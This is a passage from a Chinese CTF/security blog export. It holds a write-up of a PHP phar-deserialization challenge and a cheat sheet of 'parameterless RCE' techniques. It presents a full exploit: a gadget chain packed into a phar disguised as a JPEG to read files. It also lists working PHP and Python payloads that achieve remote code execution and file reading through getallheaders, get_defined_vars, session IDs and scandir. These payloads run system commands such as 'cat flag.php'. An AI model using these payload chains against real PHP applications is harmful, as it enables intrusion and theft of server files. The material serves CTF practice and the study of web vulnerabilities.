class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$dbaddr = <span class="string">"127.0.0.1"</span>;</span><br><span class="line">$dbuser = <span class="string">"root"</span>;</span><br><span class="line">$dbpass = <span class="string">"root"</span>;</span><br><span class="line">$dbname = <span class="string">"dropbox"</span>;</span><br><span class="line">$db = <span class="keyword">new</span> mysqli($dbaddr, $dbuser, $dbpass, $dbname);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $db;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = $db;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;store_result();</span><br><span class="line">        $count = $stmt-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> ($count === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;user_exist($username)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $password = sha1($password . <span class="string">"SiAchGHmFx"</span>);</span><br><span class="line">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"ss"</span>, $username, $password);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;user_exist($username)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $password = sha1($password . <span class="string">"SiAchGHmFx"</span>);</span><br><span class="line">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"SELECT `password` FROM `users` WHERE `username` = ?;"</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;bind_result($expect);</span><br><span class="line">        $stmt-&gt;fetch();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($expect) &amp;&amp; $expect === $password) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        $filenames = scandir($path);</span><br><span class="line"></span><br><span class="line">        $key = array_search(<span class="string">"."</span>, $filenames);</span><br><span class="line">        <span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line">        $key = array_search(<span class="string">".."</span>, $filenames);</span><br><span class="line">        <span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($filenames <span class="keyword">as</span> $filename) &#123;</span><br><span class="line">            $file = <span class="keyword">new</span> File();</span><br><span class="line">            $file-&gt;open($path . $filename);</span><br><span class="line">            array_push(<span class="keyword">$this</span>-&gt;files, $file);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($func, $args)</span> </span>&#123;</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, $func);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $table = <span class="string">'&lt;div id="container" class="container"&gt;&lt;div class="table-responsive"&gt;&lt;table id="table" class="table table-bordered table-hover sm-font"&gt;'</span>;</span><br><span class="line">        $table .= <span class="string">'&lt;thead&gt;&lt;tr&gt;'</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;funcs <span class="keyword">as</span> $func) &#123;</span><br><span class="line">            $table .= <span class="string">'&lt;th scope="col" class="text-center"&gt;'</span> . htmlentities($func) . <span class="string">'&lt;/th&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $table .= <span class="string">'&lt;th scope="col" class="text-center"&gt;Opt&lt;/th&gt;'</span>;</span><br><span class="line">        $table .= <span class="string">'&lt;/thead&gt;&lt;tbody&gt;'</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;results <span class="keyword">as</span> $filename =&gt; $result) &#123;</span><br><span class="line">            $table .= <span class="string">'&lt;tr&gt;'</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $func =&gt; $value) &#123;</span><br><span class="line">                $table .= <span class="string">'&lt;td class="text-center"&gt;'</span> . htmlentities($value) . <span class="string">'&lt;/td&gt;'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $table .= <span class="string">'&lt;td class="text-center" filename="'</span> . htmlentities($filename) . <span class="string">'"&gt;&lt;a href="#" class="download"&gt;下载&lt;/a&gt; / &lt;a href="#" class="delete"&gt;删除&lt;/a&gt;&lt;/td&gt;'</span>;</span><br><span class="line">            $table .= <span class="string">'&lt;/tr&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> $table;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span><span class="params">($filename)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">        <span class="keyword">if</span> (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> basename(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $size = filesize(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        $units = <span class="keyword">array</span>(<span class="string">' B'</span>, <span class="string">' KB'</span>, <span class="string">' MB'</span>, <span class="string">' GB'</span>, <span class="string">' TB'</span>);</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $size &gt;= <span class="number">1024</span> &amp;&amp; $i &lt; <span class="number">4</span>; $i++) $size /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> round($size, <span class="number">2</span>).$units[$i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        unlink(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码核心就在<code>class.php</code>了</p><p>先看到login和register两个文件，用了PDO，注入相当困难，找到到文件下载功能<code>download</code>，可以看到这样的一句代码：<code>ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);</code></p><p><strong>ini_set</strong>：出为一个配置选项设置值，可以设置php的一些配置，其中就包括<strong>open_basedir</strong>，用来限制当前程序可以访问的目录。当前设置为<code>getcwd()</code>当前目录和<code>/etc</code>和<code>/tmp</code>三个目录，这就是为什么前面下载不了根目录下的<code>flag</code>了</p><p>再看到<code>delete.php</code>文件，并没有限制，于是我们寻找可利用条件，重点看到<code>class.php</code>，在这个文件的<code>File</code>类中发现了<code>close()</code>方法中有一个<code>file_get_contents</code>方法，明显的文件读取，再找到使用了这个函数的方法，不难发现在<code>User</code>类中的<code>__destruct</code>方法调用了这个函数，<code>__destruct</code>方法是当一个对象被销毁的时候才调用，delete.php中就可以触发这方法，但是这也要这些类中的属性我们可控才能调用这些方法，于是这里就引出了<code>phar</code>伪协议反序列化的操作，详见上面的说明</p><p>于是初步构造payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename=<span class="string">'/flag.txt'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> User();</span><br><span class="line">$a-&gt;db = <span class="keyword">new</span> File();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>但是在<code>file_get_contents</code>后我们并没有回显的函数，于是就需要用到<code>FileList</code>类中的<code>__destruct</code>方法来回显，这里就需要再创建一个<code>FileList</code>类，令其中的<code>files</code>为<code>new File()</code>，但是这里就创建了两个类了，无法达到反序列化的效果，那么我们再来看看如何把这三个类给联系起来，可以看到<code>FileList</code>类中的<code>__call</code>方法，（ 当对象调用一个不存在的方法的时候调用，<strong>$func</strong>：被调用的方法名，<strong>$args</strong> ： 被调用方法中的参数，这是个数组），再看到上面的<code>User的</code>的<code>__destruct</code>方法，如果我们令<code>User</code>类中的<code>db</code>属性为<code>FileList</code>类，调用其中不存在的<code>close</code>方法，就可以完美触发<code>FileList</code>类中的<code>__call</code>方法，再看到<code>__call</code>方法的实现：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($func, $args)</span> </span>&#123;</span><br><span class="line">    array_push(<span class="keyword">$this</span>-&gt;funcs, $func);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>array_push</strong>：将一个或多个单元压入数组的末尾（入栈）</p><p><strong>foreach</strong>：遍历数组</p><p>看到其中的<code>$file-&gt;$func();</code>，如果<code>$func</code>为<code>close</code>，就可以成功调用<code>File</code>类中的<code>close</code>方法，于是构造完整payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>(<span class="keyword">new</span> File());</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename=<span class="string">'/flag.txt'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$o = <span class="keyword">new</span> User();</span><br><span class="line">$o -&gt; db = <span class="keyword">new</span> FileList();</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为 phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置 stub</span></span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义的 meta-data 存入 manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"poc.php"</span>, <span class="string">"poc"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">'phar.phar'</span>,<span class="string">'phar.jpg'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将生成的<code>phar.jpg</code>上传，再在<code>delete</code>操作时抓包改包，如下，即可成功得到<code>flag</code>，话说为什么是<code>flag.txt</code>我也不知道，一般不是直接<code>flag</code>吗？-.-</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504221851430.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP无参数RCE</title>
      <link href="/2020/04/28/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/"/>
      <url>/2020/04/28/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/</url>
      
        <content type="html"><![CDATA[<p>参考：</p><ul><li><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></li><li><a href="https://www.cnblogs.com/wangtanzhi/p/12260986.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/12260986.html</a></li><li><a href="http://www.manongjc.com/detail/13-ksgbihhdbvdbnza.html" target="_blank" rel="noopener">http://www.manongjc.com/detail/13-ksgbihhdbvdbnza.html</a></li><li><a href="https://www.gem-love.com/ctf/530.html?replytocom=5" target="_blank" rel="noopener">https://www.gem-love.com/ctf/530.html?replytocom=5</a></li></ul><p>膜膜膜膜膜膜（这东西真的是奇淫技巧）</p><p><strong>利用条件</strong>：<code>eval($_GET[&#39;exp&#39;]);</code></p><p><strong>限制条件</strong>：<code>preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $exp)</code></p><p><strong>目录下文件</strong>：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429110200063.png" alt=""></p><h4 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a><strong>测试代码</strong></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>(?R)</code>引用当前表达式，后面加了<code>?</code>递归调用</p><p>以上正则表达式只匹配<code>a(b(c()))</code>或<code>a()</code>这种格式，不匹配<code>a(&quot;123&quot;)</code>，也就是说我们传入的值函数不能带有参数</p><h4 id="Payload1-getenv"><a href="#Payload1-getenv" class="headerlink" title="Payload1-getenv()"></a>Payload1-getenv()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(getenv(phpinfo()));</span><br></pre></td></tr></table></figure><p>可以获取敏感信息</p><ul><li><strong>getenv()</strong>：获取一个环境变量的值，<code>phpinfo()</code>可以获取所有环境变量</li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429113257924.png" alt=""></p><h4 id="Payload2-getallheaders"><a href="#Payload2-getallheaders" class="headerlink" title="Payload2-getallheaders()"></a><strong>Payload2</strong>-getallheaders()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(end(getallheaders()));</span><br></pre></td></tr></table></figure><p>RCE</p><ul><li><strong>end()</strong>：将数组的内部指针指向最后一个单元</li><li><strong>getallheaders()</strong>：获取全部 HTTP 请求头信息</li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429114144142.png" alt=""></p><h4 id="Payload3-get-defined-vars"><a href="#Payload3-get-defined-vars" class="headerlink" title="Payload3-get_defined_vars()"></a>Payload3-get_defined_vars()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(end(current(get_defined_vars())));&amp;flag=system(<span class="string">'ls'</span>);</span><br></pre></td></tr></table></figure><p>利用全局变量进RCE</p><ul><li><strong>get_defined_vars()</strong>：返回由所有已定义变量所组成的数组，会返回<code>$_GET,$_POST,$_COOKIE,$_FILES</code>全局变量的值</li><li><strong>current()</strong>：返回数组中的当前单元，初始指向插入到数组中的第一个单元，也就是会返回<code>$_GET</code>变量的数组值</li><li><strong>get_defined_vars()</strong>：返回由所有已定义变量所组成的数组，此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。返回数组顺序为<code>get-&gt;post-&gt;cookie-&gt;files</code></li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429115651090.png" alt=""></p><p>而如果网站对<code>$_GET,$_POST,$_COOKIE</code>都做的过滤， 那我们只能从<code>$_FILES</code>入手了，exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2hex</span><span class="params">(payload)</span>:</span></span><br><span class="line">  txt = <span class="string">''</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">      txt += hex(ord(i))[<span class="number">-2</span>:]</span><br><span class="line">  <span class="keyword">return</span> txt</span><br><span class="line">payload = str2hex(<span class="string">"system('cat flag.php');"</span>)</span><br><span class="line">files = &#123;</span><br><span class="line">    payload: <span class="string">b'extrader'</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(<span class="string">"http://192.168.0.107/index.php?exp=eval(hex2bin(array_rand(end(get_defined_vars()))));"</span>, files=files, allow_redirects=<span class="literal">False</span>)  <span class="comment"># allow_redirects=False 禁用重定向处理</span></span><br><span class="line">print(r.content.decode())</span><br></pre></td></tr></table></figure><ul><li><strong>array_rand()</strong>：从数组中随机取出一个或多个单元，如果只取出一个，<code>array_rand()</code>返回随机单元的键名。 否则就返回包含随机键名的数组。</li><li><strong>end()</strong>：将数组的内部指针指向最后一个单元</li><li><strong>hex2bin()</strong>：转换十六进制字符串为二进制字符串</li></ul><p>结果将输出<code>flag.php</code>文件的全部内容，由于空格和点都会被替换成下换线，所以需要用十六进制进行绕过</p><h4 id="Payload4-session-start"><a href="#Payload4-session-start" class="headerlink" title="Payload4-session_start()"></a>Payload4-session_start()</h4><p>文件读取：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">show_source(session_id(session_start()));</span><br><span class="line">var_dump(file_get_contents(session_id(session_start())))</span><br><span class="line">highlight_file(session_id(session_start()));</span><br><span class="line">readfile(session_id(session_start()));</span><br><span class="line">抓包传入Cookie: PHPSESSID=(想读的文件)即可</span><br></pre></td></tr></table></figure><p>RCE：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(hex2bin(session_id(session_start())));</span><br><span class="line">抓包传入Cookie: PHPSESSID=(<span class="string">"system('命令')"</span>的十六进制)</span><br></pre></td></tr></table></figure><p>以上的payload好像只适用于<code>php7</code>以下的版本，php7以上的不会显示</p><ul><li><strong>session_start()</strong>：启动新会话或者重用现有会话，成功开始会话返回 <strong><code>TRUE</code></strong> ，反之返回 <strong><code>FALSE</code></strong></li><li><strong>session_id()</strong>：获取/设置当前会话 ID，返回当前会话ID。 如果当前没有会话，则返回空字符串（””）。</li></ul><h4 id="Payload5-scandir"><a href="#Payload5-scandir" class="headerlink" title="Payload5-scandir()"></a>Payload5-scandir()</h4><p>文件读取：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当前目录：highlight_file(array_rand(array_flip(scandir(getcwd()))));</span><br><span class="line">上级目录文件：highlight_file(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));</span><br></pre></td></tr></table></figure><ul><li><strong>getcwd()</strong>：取得当前工作目录，成功则返回当前工作目录，失败返回 <strong><code>FALSE</code></strong>。</li><li><strong>dirname()</strong>：返回路径中的目录部分，返回 path 的父目录。 如果在 <code>path</code> 中没有斜线，则返回一个点（’<em>.</em>‘），表示当前目录。否则返回的是把 <code>path</code> 中结尾的 <code>/component</code>（最后一个斜线以及后面部分）去掉之后的字符串(也就是上级目录的文件路径)。</li><li><strong>chdir()</strong>：改变目录，成功时返回 <strong><code>TRUE</code></strong>， 或者在失败时返回 <strong><code>FALSE</code></strong>。</li><li><strong>scandir()</strong>：列出指定路径中的文件和目录。成功则返回包含有文件名的数组，如果失败则返回 <strong><code>FALSE</code></strong>。如果 <code>directory</code> 不是个目录，则返回布尔值 <strong><code>FALSE</code></strong> 并生成一条 <strong><code>E_WARNING</code></strong> 级的错误。</li><li><strong>array_flip()</strong>：交换数组中的键和值，成功时返回交换后的数组，如果失败返回 <strong><code>NULL</code></strong>。</li><li><strong>array_rand()</strong>：从数组中随机取出一个或多个单元，如果只取出一个(默认为1)，<strong>array_rand()</strong> 返回随机单元的键名。 否则就返回包含随机键名的数组。 完成后，就可以根据随机的键获取数组的随机值。</li></ul><p><strong>array_flip()</strong>和<strong>array_rand()</strong>配合使用可随机返回当前目录下的文件名</p><p><strong>dirname(chdir(dirname()))</strong>配合切换文件路径</p><h4 id="绕过"><a href="#绕过" class="headerlink" title=".绕过"></a><code>.</code>绕过</h4><h5 id="current-localeconv"><a href="#current-localeconv" class="headerlink" title="current(localeconv())"></a><strong>current(localeconv())</strong></h5><ul><li><strong>localeconv()</strong>：返回一包含本地数字及货币格式信息的数组。而数组第一项就是<code>.</code></li></ul><h5 id="phpversion"><a href="#phpversion" class="headerlink" 